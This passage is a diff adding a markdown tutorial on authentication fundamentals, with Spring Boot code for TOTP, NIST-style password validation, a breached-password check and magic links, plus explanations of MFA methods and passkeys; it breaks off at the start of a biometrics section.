@@ -2809,7 +2809,1953 @@ ECDHE = Elliptic Curve Diffie-Hellman EPHEMERAL
 - Forward secrecy (ECDHE) protects past sessions if keys are later compromised
 - TLS 1.3 is faster and more secure than TLS 1.2
 - Automate certificate management to prevent outages
+---
 
 # AUTHENTICATION FUNDAMENTALS Who Are You? Proving Identity in the Digital World
 
+
+## 1. THE THREE PILLARS: Identification, Authentication, Authorization
+
+```
+These three terms are often confused. Let's fix that forever.
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  IDENTIFICATION: "Who are you claiming to be?"                          │
+│  ───────────────────────────────────────────                            │
+│  • Username, email, employee ID                                         │
+│  • Just a CLAIM - no proof yet                                          │
+│  • Example: "I am deniz@company.com"                                    │
+│                                                                         │
+│                          ↓                                              │
+│                                                                         │
+│  AUTHENTICATION: "Prove it!"                                            │
+│  ─────────────────────────                                              │
+│  • Password, fingerprint, security key                                  │
+│  • VERIFIES the claimed identity                                        │
+│  • Example: "Here's my password: ********"                              │
+│                                                                         │
+│                          ↓                                              │
+│                                                                         │
+│  AUTHORIZATION: "What are you allowed to do?"                           │
+│  ──────────────────────────────────────────                             │
+│  • Permissions, roles, access rights                                    │
+│  • DETERMINES what actions are permitted                                │
+│  • Example: "Deniz can read orders but not delete users"                │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Real-World Analogy
+
+```
+AIRPORT SECURITY:
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  1. IDENTIFICATION                                                      │
+│     Guard: "Name please?"                                               │
+│     You: "Deniz" (claim)                                         │
+│                                                                         │
+│  2. AUTHENTICATION                                                      │
+│     Guard: "Show me your passport"                                      │
+│     You: [Shows passport with photo] (proof)                            │
+│     Guard: [Compares face to photo] ✓                                   │
+│                                                                         │
+│  3. AUTHORIZATION                                                       │
+│     Guard: "Your boarding pass says Gate B12, Economy"                  │
+│     You: Can board flight at B12                                        │
+│     You: Cannot enter First Class lounge (not authorized)               │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### In Your Spring Boot Application
+
+java
+
+```java
+// ═══════════════════════════════════════════════════════════════════════
+// THE THREE STEPS IN CODE
+// ═══════════════════════════════════════════════════════════════════════
+
+@RestController
+@RequestMapping("/api")
+public class OrderController {
+
+    // STEP 1: IDENTIFICATION
+    // User claims identity by sending username in login request
+    @PostMapping("/login")
+    public TokenResponse login(@RequestBody LoginRequest request) {
+        String username = request.getUsername();  // "I am deniz@company.com"
+        String password = request.getPassword();
+        
+        // STEP 2: AUTHENTICATION
+        // Verify the claim is true
+        Authentication auth = authenticationManager.authenticate(
+            new UsernamePasswordAuthenticationToken(username, password)
+        );
+        // If we reach here, identity is VERIFIED
+        
+        return tokenService.generateToken(auth);
+    }
+    
+    // STEP 3: AUTHORIZATION
+    // After authentication, check what user can DO
+    @GetMapping("/orders")
+    @PreAuthorize("hasRole('ORDER_VIEWER')")  // Authorization check
+    public List<Order> getOrders() {
+        // Only users with ORDER_VIEWER role can access
+        return orderService.findAll();
+    }
+    
+    @DeleteMapping("/users/{id}")
+    @PreAuthorize("hasRole('USER_ADMIN')")  // Different authorization
+    public void deleteUser(@PathVariable Long id) {
+        // Only USER_ADMIN can delete users
+        userService.delete(id);
+    }
+}
+```
+
+### Common Confusion Points
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        COMMON MISTAKES                                  │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  ❌ "Authentication failed - you're not authorized"                     │
+│     → WRONG terminology! Should be "Authentication failed"              │
+│                                                                         │
+│  ❌ "You're not authenticated to delete users"                          │
+│     → WRONG! You ARE authenticated, but NOT AUTHORIZED                  │
+│                                                                         │
+│  ✅ CORRECT:                                                            │
+│     • 401 Unauthorized = Authentication failed (who are you?)           │
+│     • 403 Forbidden = Authorization failed (you can't do that)          │
+│                                                                         │
+│  NOTE: HTTP status code naming is historically confusing:               │
+│     • 401 "Unauthorized" really means "Unauthenticated"                 │
+│     • 403 "Forbidden" really means "Unauthorized"                       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 2. AUTHENTICATION FACTORS - The Three Types
+```
+AUTHENTICATION FACTORS: Different TYPES of proof
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  SOMETHING YOU KNOW (Knowledge Factor)                          │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │  • Password                                                     │   │
+│  │  • PIN                                                          │   │
+│  │  • Security questions ("Mother's maiden name")                  │   │
+│  │  • Pattern (Android lock screen)                                │   │
+│  │                                                                 │   │
+│  │  WEAKNESSES:                                                    │   │
+│  │  • Can be guessed, stolen, phished                              │   │
+│  │  • Users reuse passwords across sites                           │   │
+│  │  • Can be observed (shoulder surfing)                           │   │
+│  │  • Forgotten → account recovery issues                          │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                        │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  SOMETHING YOU HAVE (Possession Factor)                         │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │  • Phone (SMS code, authenticator app)                          │   │
+│  │  • Hardware security key (YubiKey)                              │   │
+│  │  • Smart card                                                   │   │
+│  │  • Email access (for verification links)                        │   │
+│  │                                                                 │   │
+│  │  WEAKNESSES:                                                    │   │
+│  │  • Can be lost or stolen                                        │   │
+│  │  • SIM swapping attacks (for SMS)                               │   │
+│  │  • Email account can be compromised                             │   │
+│  │  • Battery/connectivity issues                                  │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                        │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  SOMETHING YOU ARE (Inherence Factor / Biometrics)              │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │  • Fingerprint                                                  │   │
+│  │  • Face recognition                                             │   │
+│  │  • Iris scan                                                    │   │
+│  │  • Voice recognition                                            │   │
+│  │  • Typing pattern (behavioral biometrics)                       │   │
+│  │                                                                 │   │
+│  │  WEAKNESSES:                                                    │   │
+│  │  • Cannot be changed if compromised!                            │   │
+│  │  • Privacy concerns                                             │   │
+│  │  • False positives/negatives                                    │   │
+│  │  • Can be spoofed (photos, fingerprint molds)                   │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Factor Strength Comparison
+```
+SINGLE FACTOR (Weak):
+Password only → Phished in seconds
+
+TWO FACTORS (Strong):
+Password + Phone → Attacker needs BOTH
+
+THREE FACTORS (Very Strong):
+Password + Phone + Fingerprint → Used for high-security (banks, military)
+
+
+┌─────────────────┬────────────────────────────────────────────────────────┐
+│ Attack          │ Factors Defeated                                       │
+├─────────────────┼────────────────────────────────────────────────────────┤
+│ Phishing        │ Know ✓, Have ✗ (TOTP), Are ✗                          │
+│ Password leak   │ Know ✓, Have ✗, Are ✗                                 │
+│ Phone theft     │ Know ✗, Have ✓, Are ✗ (if PIN protected)              │
+│ SIM swap        │ Know ✗, Have ✓ (SMS only), Are ✗                      │
+│ Physical attack │ Know ?, Have ✓, Are ? (coercion)                      │
+└─────────────────┴────────────────────────────────────────────────────────┘
+
+KEY INSIGHT: Each factor has different attack vectors.
+             Combining factors provides LAYERED protection.
+```
+
+---
+
+## 3. MULTI-FACTOR AUTHENTICATION (MFA) METHODS
+
+### SMS OTP (One-Time Password)
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        SMS OTP (⚠️ WEAKEST MFA)                         │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  FLOW:                                                                  │
+│  1. User enters password                                                │
+│  2. Server sends 6-digit code via SMS                                   │
+│  3. User enters code                                                    │
+│  4. Server verifies code                                                │
+│                                                                         │
+│  VULNERABILITIES:                                                       │
+│  • SIM Swapping: Attacker convinces carrier to transfer your number     │
+│  • SS7 Attacks: Telecom protocol vulnerabilities intercept SMS          │
+│  • Malware: Phone malware reads incoming SMS                            │
+│  • Social Engineering: "I'm from IT, read me the code"                  │
+│                                                                         │
+│  VERDICT: Better than nothing, but use TOTP or hardware keys instead    │
+│                                                                         │
+│  NIST RECOMMENDATION: SMS is "RESTRICTED" authenticator                 │
+│                       (acceptable but not preferred)                    │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### TOTP (Time-based One-Time Password)
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        TOTP (✅ RECOMMENDED)                            │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Apps: Google Authenticator, Authy, Microsoft Authenticator, 1Password  │
+│                                                                         │
+│  HOW IT WORKS:                                                          │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │                                                                 │    │
+│  │  Setup (once):                                                  │    │
+│  │  • Server generates random SECRET KEY (e.g., "JBSWY3DPEHPK3PXP")│    │
+│  │  • Server shows QR code containing the secret                   │    │
+│  │  • User scans QR code with authenticator app                    │    │
+│  │  • Both server and app now share the SECRET                     │    │
+│  │                                                                 │    │
+│  │  Login (every time):                                            │    │
+│  │  • App computes: TOTP = HMAC-SHA1(secret, time/30) → 6 digits   │    │
+│  │  • Server computes SAME thing                                   │    │
+│  │  • If codes match → authenticated                               │    │
+│  │                                                                 │    │
+│  │  Time Window: Code changes every 30 seconds                     │    │
+│  │  Server accepts: current code ± 1 window (for clock drift)      │    │
+│  │                                                                 │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                                                                         │
+│  ADVANTAGES:                                                            │
+│  • Works offline (no SMS network needed)                                │
+│  • No SIM swap vulnerability                                            │
+│  • Standardized (RFC 6238)                                              │
+│                                                                         │
+│  VULNERABILITIES:                                                       │
+│  • Phishable: User can be tricked into entering code on fake site       │
+│  • Secret theft: If server's secret DB is stolen, all TOTP compromised  │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+````
+
+### TOTP Implementation in Java
+
+```java
+// Using the 'com.warrenstrange:googleauth' library
+// Maven: com.warrenstrange:googleauth:1.5.0
+
+import com.warrenstrange.googleauth.GoogleAuthenticator;
+import com.warrenstrange.googleauth.GoogleAuthenticatorKey;
+import com.warrenstrange.googleauth.GoogleAuthenticatorQRGenerator;
+
+@Service
+public class TotpService {
+    
+    private final GoogleAuthenticator gAuth = new GoogleAuthenticator();
+    private final UserRepository userRepository;
+    
+    /**
+     * Enable TOTP for a user - returns QR code URL
+     */
+    public TotpSetupResponse enableTotp(Long userId) {
+        User user = userRepository.findById(userId)
+            .orElseThrow(() -> new UserNotFoundException(userId));
+        
+        // Generate secret key
+        GoogleAuthenticatorKey key = gAuth.createCredentials();
+        String secret = key.getKey();  // e.g., "JBSWY3DPEHPK3PXP"
+        
+        // Store secret (ENCRYPTED!) in database
+        user.setTotpSecret(encryptionService.encrypt(secret));
+        user.setTotpEnabled(false);  // Not enabled until verified
+        userRepository.save(user);
+        
+        // Generate QR code URL for authenticator app
+        String qrCodeUrl = GoogleAuthenticatorQRGenerator.getOtpAuthTotpURL(
+            "MyApp",           // Issuer (your app name)
+            user.getEmail(),   // Account name
+            key                // Contains the secret
+        );
+        
+        // Also provide manual entry option
+        return new TotpSetupResponse(qrCodeUrl, secret);
+    }
+    
+    /**
+     * Verify TOTP code and enable MFA
+     */
+    public boolean verifyAndEnableTotp(Long userId, int code) {
+        User user = userRepository.findById(userId)
+            .orElseThrow(() -> new UserNotFoundException(userId));
+        
+        String secret = encryptionService.decrypt(user.getTotpSecret());
+        
+        // Verify the code
+        boolean valid = gAuth.authorize(secret, code);
+        
+        if (valid) {
+            user.setTotpEnabled(true);
+            userRepository.save(user);
+            
+            // Generate backup codes
+            generateBackupCodes(user);
+        }
+        
+        return valid;
+    }
+    
+    /**
+     * Verify TOTP during login
+     */
+    public boolean verifyTotp(Long userId, int code) {
+        User user = userRepository.findById(userId)
+            .orElseThrow(() -> new UserNotFoundException(userId));
+        
+        if (!user.isTotpEnabled()) {
+            throw new TotpNotEnabledException();
+        }
+        
+        String secret = encryptionService.decrypt(user.getTotpSecret());
+        return gAuth.authorize(secret, code);
+    }
+    
+    /**
+     * Generate one-time backup codes (store hashed!)
+     */
+    private void generateBackupCodes(User user) {
+        List<String> codes = new ArrayList<>();
+        SecureRandom random = new SecureRandom();
+        
+        for (int i = 0; i < 10; i++) {
+            // Generate 8-character alphanumeric code
+            String code = String.format("%08d", random.nextInt(100000000));
+            codes.add(code);
+            
+            // Store HASHED (these are like passwords!)
+            BackupCode backupCode = new BackupCode();
+            backupCode.setUser(user);
+            backupCode.setCodeHash(passwordEncoder.encode(code));
+            backupCode.setUsed(false);
+            backupCodeRepository.save(backupCode);
+        }
+        
+        // Show codes to user ONCE (they must save them)
+        // After this, we only have hashes
+    }
+}
+```
+
+### Hardware Security Keys (FIDO2/WebAuthn)
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                  HARDWARE SECURITY KEYS (✅✅ STRONGEST)                │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Devices: YubiKey, Google Titan, Feitian, SoloKeys                      │
+│  Protocols: FIDO2 / WebAuthn (modern), U2F (older)                      │
+│                                                                         │
+│  HOW IT WORKS:                                                          │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │                                                                 │    │
+│  │  Registration:                                                  │    │
+│  │  1. Server sends challenge (random bytes)                       │    │
+│  │  2. Security key generates NEW key pair for this site           │    │
+│  │  3. Key signs challenge with private key                        │    │
+│  │  4. Server stores public key                                    │    │
+│  │                                                                 │    │
+│  │  Login:                                                         │    │
+│  │  1. Server sends challenge                                      │    │
+│  │  2. User touches security key                                   │    │
+│  │  3. Key signs challenge with private key                        │    │
+│  │  4. Server verifies signature with stored public key            │    │
+│  │                                                                 │    │
+│  │  CRITICAL: Key checks ORIGIN (domain)!                          │    │
+│  │  Phishing site can't use the credential - wrong origin!         │    │
+│  │                                                                 │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                                                                         │
+│  WHY IT'S STRONGEST:                                                    │
+│  • PHISHING RESISTANT: Key verifies the actual domain                   │
+│  • No shared secrets: Only public key on server                         │
+│  • Physical presence: Must touch/tap the device                         │
+│  • No network: Works offline, no SMS/internet needed                    │
+│                                                                         │
+│  GOOGLE'S EXPERIENCE:                                                   │
+│  After deploying security keys to 85,000+ employees:                    │
+│  "Zero successful phishing attacks" - Google Security Blog, 2018        │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### MFA Method Comparison
+```
+┌───────────────┬───────────┬────────────┬────────────┬──────────────────┐
+│ Method        │ Phishing  │ SIM Swap   │ Ease of    │ Cost             │
+│               │ Resistant │ Resistant  │ Use        │                  │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ SMS OTP       │    ❌     │    ❌      │    ✅✅   │ Free             │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ Email OTP     │    ❌     │    ✅      │    ✅✅   │ Free             │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ TOTP App      │    ❌     │    ✅      │    ✅     │ Free             │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ Push Notify   │    ⚠️     │    ✅      │    ✅✅   │ Free/Paid        │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ Hardware Key  │    ✅     │    ✅      │    ✅     │ $25-50 per key   │
+├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
+│ Passkeys      │    ✅     │    ✅      │    ✅✅   │ Free             │
+└───────────────┴───────────┴────────────┴────────────┴──────────────────┘
+```
+
+RECOMMENDATION BY USE CASE:
+- Consumer apps: TOTP or Passkeys
+- Enterprise: Hardware keys for admins, TOTP for others
+- High-security: Hardware keys mandatory
+- Legacy/compatibility: SMS (if nothing else works)
+
+---
+
+## 4. PASSWORD POLICIES - NIST 2024 Guidelines
+
+### The Old Way (WRONG!) ❌
+```
+OLD PASSWORD POLICIES (pre-2017) - DON'T DO THIS:
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ❌ "Password must contain:"                                            │
+│     • Uppercase letter                                                  │
+│     • Lowercase letter                                                  │
+│     • Number                                                            │
+│     • Special character (!@#$%^&*)                                      │
+│     • Minimum 8 characters                                              │
+│     • Change every 90 days                                              │
+│     • Cannot reuse last 10 passwords                                    │
+│                                                                         │
+│  RESULT:                                                                │
+│  • Users create: "Password1!" → "Password2!" → "Password3!"             │
+│  • Or: "P@ssw0rd" "Summer2024!" "Company123!"                           │
+│  • Predictable patterns that attackers know                             │
+│  • Users write passwords on sticky notes                                │
+│  • Frequent resets increase help desk costs                             │
+│                                                                         │
+│  RESEARCH SHOWED: Complex rules DON'T improve security!                 │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### The New Way (NIST SP 800-63B) ✅
+```
+MODERN PASSWORD POLICIES (NIST 2017, updated 2024):
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ✅ DO:                                                                 │
+│                                                                         │
+│  • Minimum 8 characters (NIST), 12-15 recommended                       │
+│  • Maximum 64+ characters (allow passphrases!)                          │
+│  • Allow ALL printable characters including spaces                      │
+│  • Allow Unicode (emoji passwords are fine: "🔐MyD0g🐕!")               │
+│  • Check against breached password lists (HIBP)                         │
+│  • Check against common passwords (password, 123456, qwerty)            │
+│  • Check against context-specific words (company name, username)        │
+│  • Allow paste into password fields (password managers!)                │
+│  • Show password strength meter                                         │
+│  • Offer "show password" toggle                                         │
+│                                                                         │
+│  ❌ DON'T:                                                              │
+│                                                                         │
+│  • Require specific character types                                     │
+│  • Force periodic password changes (unless compromised)                 │
+│  • Use password hints or security questions                             │
+│  • Truncate passwords                                                   │
+│  • Block paste in password fields                                       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Why Length > Complexity
+```
+ENTROPY COMPARISON:
+
+Password: "P@ssw0rd"
+- 8 characters
+- Looks "complex" but is predictable
+- In every password cracking dictionary
+- Cracked in: SECONDS
+
+Passphrase: "correct horse battery staple"
+- 28 characters
+- Easy to remember
+- High entropy (random word combination)
+- Cracked in: CENTURIES
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  MATH:                                                                  │
+│                                                                         │
+│  "P@ssw0rd" (8 chars, ~95 possible each)                                │
+│  Theoretical: 95^8 = 6.6 quadrillion combinations                       │
+│  Reality: It's in dictionary lists, cracked instantly                   │
+│                                                                         │
+│  "correct horse battery staple" (4 random words from 7,776 word list)   │
+│  Combinations: 7,776^4 = 3.6 quadrillion combinations                   │
+│  Reality: NOT in dictionaries, actually requires brute force            │
+│                                                                         │
+│  SAME theoretical strength, but passphrase is:                          │
+│  • Easier to remember                                                   │
+│  • Harder to crack in practice                                          │
+│  • Less likely to be written down                                       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Implementing Modern Password Validation
+
+
+
+```java
+@Service
+public class PasswordPolicyService {
+    
+    private static final int MIN_LENGTH = 12;
+    private static final int MAX_LENGTH = 128;
+    
+    private final PwnedPasswordsClient pwnedClient;  // HIBP API
+    private final Set<String> commonPasswords;        // Top 100k passwords
+    
+    /**
+     * Validate password against NIST guidelines
+     */
+    public PasswordValidationResult validate(String password, User user) {
+        List<String> errors = new ArrayList<>();
+        
+        // Length check
+        if (password.length() < MIN_LENGTH) {
+            errors.add("Password must be at least " + MIN_LENGTH + " characters");
+        }
+        if (password.length() > MAX_LENGTH) {
+            errors.add("Password cannot exceed " + MAX_LENGTH + " characters");
+        }
+        
+        // Context-specific check (username, email, company name)
+        String lowerPassword = password.toLowerCase();
+        if (user.getUsername() != null && 
+            lowerPassword.contains(user.getUsername().toLowerCase())) {
+            errors.add("Password cannot contain your username");
+        }
+        if (user.getEmail() != null) {
+            String emailPrefix = user.getEmail().split("@")[0].toLowerCase();
+            if (lowerPassword.contains(emailPrefix)) {
+                errors.add("Password cannot contain your email");
+            }
+        }
+        
+        // Common password check
+        if (commonPasswords.contains(lowerPassword)) {
+            errors.add("This password is too common. Please choose a different one");
+        }
+        
+        // Breached password check (async in production)
+        if (pwnedClient.isPasswordBreached(password)) {
+            errors.add("This password has appeared in a data breach. " +
+                       "Please choose a different one");
+        }
+        
+        // Repetitive/sequential patterns
+        if (hasRepetitivePattern(password)) {
+            errors.add("Password cannot be a repetitive pattern like 'aaaaaa' or '123123'");
+        }
+        
+        return new PasswordValidationResult(errors.isEmpty(), errors);
+    }
+    
+    private boolean hasRepetitivePattern(String password) {
+        // Check for repeated characters: "aaaaaaa"
+        if (password.matches("^(.)\\1+$")) return true;
+        
+        // Check for sequential: "123456", "abcdef"
+        if (isSequential(password)) return true;
+        
+        // Check for repeated patterns: "abcabc"
+        for (int len = 1; len <= password.length() / 2; len++) {
+            String pattern = password.substring(0, len);
+            String repeated = pattern.repeat(password.length() / len);
+            if (password.startsWith(repeated)) return true;
+        }
+        
+        return false;
+    }
+    
+    private boolean isSequential(String password) {
+        if (password.length() < 4) return false;
+        
+        boolean allIncreasing = true;
+        boolean allDecreasing = true;
+        
+        for (int i = 1; i < password.length(); i++) {
+            int diff = password.charAt(i) - password.charAt(i - 1);
+            if (diff != 1) allIncreasing = false;
+            if (diff != -1) allDecreasing = false;
+        }
+        
+        return allIncreasing || allDecreasing;
+    }
+}
+```
+
+### Have I Been ``Pwned`` Integration
+
+
+```java
+@Service
+public class PwnedPasswordsClient {
+    
+    private final RestTemplate restTemplate;
+    
+    /**
+     * Check if password appears in breaches using k-Anonymity model
+     * 
+     * We don't send the actual password!
+     * 1. Hash password with SHA-1
+     * 2. Send first 5 characters to API
+     * 3. API returns all hashes starting with those 5 chars
+     * 4. We check locally if our full hash is in the list
+     */
+    public boolean isPasswordBreached(String password) {
+        try {
+            // Hash the password
+            String sha1Hash = DigestUtils.sha1Hex(password).toUpperCase();
+            String prefix = sha1Hash.substring(0, 5);   // First 5 chars
+            String suffix = sha1Hash.substring(5);       // Rest of hash
+            
+            // Query API with prefix only (k-Anonymity)
+            String url = "https://api.pwnedpasswords.com/range/" + prefix;
+            String response = restTemplate.getForObject(url, String.class);
+            
+            // Check if our suffix is in the response
+            // Response format: "SUFFIX:COUNT\r\nSUFFIX:COUNT\r\n..."
+            for (String line : response.split("\r\n")) {
+                String[] parts = line.split(":");
+                if (parts[0].equals(suffix)) {
+                    int count = Integer.parseInt(parts[1]);
+                    log.warn("Password found in {} breaches", count);
+                    return true;
+                }
+            }
+            
+            return false;
+            
+        } catch (Exception e) {
+            log.error("Error checking HIBP", e);
+            return false;  // Fail open (don't block registration if API is down)
+        }
+    }
+}
+```
+
+---
+
+## 5. PASSWORDLESS AUTHENTICATION
+
+### The Problem with Passwords
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    WHY PASSWORDS ARE PROBLEMATIC                        │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  FOR USERS:                                                             │
+│  • Average person has 100+ online accounts                              │
+│  • Can't remember unique strong passwords for each                      │
+│  • Password manager adoption is still low                               │
+│  • Forgotten password = friction = lost customers                       │
+│                                                                         │
+│  FOR SECURITY:                                                          │
+│  • 81% of breaches involve weak/stolen passwords (Verizon DBIR)         │
+│  • Phishing attacks steal passwords easily                              │
+│  • Credential stuffing: leaked passwords tried everywhere               │
+│  • Password spraying: common passwords tried on many accounts           │
+│                                                                         │
+│  SOLUTION: Eliminate passwords entirely!                                │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### WebAuthn / Passkeys
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      PASSKEYS (The Future)                              │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Passkeys = WebAuthn credentials synced across devices                  │
+│  Supported by: Apple, Google, Microsoft (2022+)                         │
+│                                                                         │
+│  HOW IT WORKS:                                                          │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │                                                                 │   │
+│  │  Registration:                                                  │   │
+│  │  1. User clicks "Create Passkey"                                │   │
+│  │  2. Device prompts for biometric (Face ID / fingerprint)        │   │
+│  │  3. Device creates key pair for this site                       │   │
+│  │  4. Public key sent to server                                   │   │
+│  │  5. Private key stored in device's secure enclave               │   │
+│  │  6. Passkey synced to user's cloud (iCloud, Google Password Mgr)│   │
+│  │                                                                 │   │
+│  │  Login:                                                         │   │
+│  │  1. User clicks "Sign in with Passkey"                          │   │
+│  │  2. Device prompts for biometric                                │   │
+│  │  3. Device signs challenge with private key                     │   │
+│  │  4. Server verifies with stored public key                      │   │
+│  │  5. User is logged in!                                          │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  USER EXPERIENCE:                                                       │
+│  • No password to create or remember                                    │
+│  • Just use fingerprint or face                                         │
+│  • Works across all devices (synced)                                    │
+│  • Can use phone to sign in on laptop (cross-device)                    │
+│                                                                         │
+│  SECURITY:                                                              │
+│  • Phishing resistant (origin bound)                                    │
+│  • No shared secrets                                                    │
+│  • Private key never leaves device                                      │
+│  • Biometric is local verification only                                 │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Passkey Flow Diagram
+```
+REGISTRATION:
+
+┌──────────┐                    ┌──────────┐                    ┌──────────┐
+│  USER    │                    │ BROWSER  │                    │  SERVER  │
+└────┬─────┘                    └────┬─────┘                    └────┬─────┘
+     │                               │                               │
+     │  Click "Create Passkey"       │                               │
+     │──────────────────────────────►│                               │
+     │                               │    Request challenge          │
+     │                               │──────────────────────────────►│
+     │                               │                               │
+     │                               │◄────── Challenge + options ───│
+     │                               │                               │
+     │◄─── Prompt: Use Face ID? ─────│                               │
+     │                               │                               │
+     │──── [User approves] ─────────►│                               │
+     │                               │                               │
+     │     Device creates key pair   │                               │
+     │     Signs challenge           │                               │
+     │                               │                               │
+     │                               │─── Public key + signed resp ─►│
+     │                               │                               │
+     │                               │            Store public key   │
+     │                               │                               │
+     │                               │◄────────── Success ───────────│
+     │◄─── "Passkey created!" ───────│                               │
+
+
+AUTHENTICATION:
+
+┌──────────┐                    ┌──────────┐                    ┌──────────┐
+│  USER    │                    │ BROWSER  │                    │  SERVER  │
+└────┬─────┘                    └────┬─────┘                    └────┬─────┘
+     │                               │                               │
+     │  Click "Sign in"              │                               │
+     │──────────────────────────────►│    Request challenge          │
+     │                               │──────────────────────────────►│
+     │                               │                               │
+     │                               │◄────── Challenge ─────────────│
+     │                               │                               │
+     │◄─── Prompt: Use Face ID? ─────│                               │
+     │                               │                               │
+     │──── [User approves] ─────────►│                               │
+     │                               │                               │
+     │     Device signs challenge    │                               │
+     │     with private key          │                               │
+     │                               │                               │
+     │                               │───── Signed response ────────►│
+     │                               │                               │
+     │                               │      Verify with public key   │
+     │                               │                               │
+     │                               │◄────── Auth token ────────────│
+     │◄───── "Welcome back!" ────────│                               │
+```
+
+### Magic Links (Email-Based Passwordless)
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      MAGIC LINKS (Simple Passwordless)                  │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  FLOW:                                                                  │
+│  1. User enters email                                                   │
+│  2. Server generates secure random token                                │
+│  3. Server sends email with link: https://app.com/auth?token=abc123    │
+│  4. User clicks link                                                    │
+│  5. Server validates token, creates session                             │
+│                                                                         │
+│  IMPLEMENTATION:                                                        │
+│                                                                         │
+│  @Service                                                               │
+│  public class MagicLinkService {                                        │
+│                                                                         │
+│      public void sendMagicLink(String email) {                          │
+│          User user = userRepository.findByEmail(email)                  │
+│              .orElseThrow();                                            │
+│                                                                         │
+│          // Generate secure token                                       │
+│          String token = generateSecureToken();  // 32+ bytes, Base64   │
+│                                                                         │
+│          // Store with expiration (15 minutes)                          │
+│          MagicLink link = new MagicLink();                              │
+│          link.setToken(hashToken(token));  // Store HASHED!            │
+│          link.setUserId(user.getId());                                  │
+│          link.setExpiresAt(Instant.now().plusMinutes(15));             │
+│          link.setUsed(false);                                           │
+│          magicLinkRepository.save(link);                                │
+│                                                                         │
+│          // Send email                                                  │
+│          String url = "https://app.com/auth/magic?token=" + token;     │
+│          emailService.send(email, "Sign in to App", url);              │
+│      }                                                                  │
+│                                                                         │
+│      public Authentication verifyMagicLink(String token) {              │
+│          String hashedToken = hashToken(token);                         │
+│                                                                         │
+│          MagicLink link = magicLinkRepository                           │
+│              .findByTokenAndUsedFalse(hashedToken)                      │
+│              .orElseThrow(() -> new InvalidTokenException());           │
+│                                                                         │
+│          if (link.getExpiresAt().isBefore(Instant.now())) {            │
+│              throw new TokenExpiredException();                         │
+│          }                                                              │
+│                                                                         │
+│          // Mark as used (one-time use!)                                │
+│          link.setUsed(true);                                            │
+│          magicLinkRepository.save(link);                                │
+│                                                                         │
+│          // Create session                                              │
+│          User user = userRepository.findById(link.getUserId()).get();  │
+│          return createAuthentication(user);                             │
+│      }                                                                  │
+│  }                                                                      │
+│                                                                         │
+│  SECURITY CONSIDERATIONS:                                               │
+│  • Token must be cryptographically random (SecureRandom)                │
+│  • Store token HASHED in database                                       │
+│  • Short expiration (15-30 minutes)                                     │
+│  • One-time use only                                                    │
+│  • Rate limit requests per email                                        │
+│  • Email security becomes critical!                                     │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 6. BIOMETRIC AUTHENTICATION
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    BIOMETRICS - IMPORTANT NUANCES                       │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  COMMON MISCONCEPTION:                                                  │
+│  "My fingerprint is my password"                                        │
+│                                                                         │
+│  REALITY:                                                               │
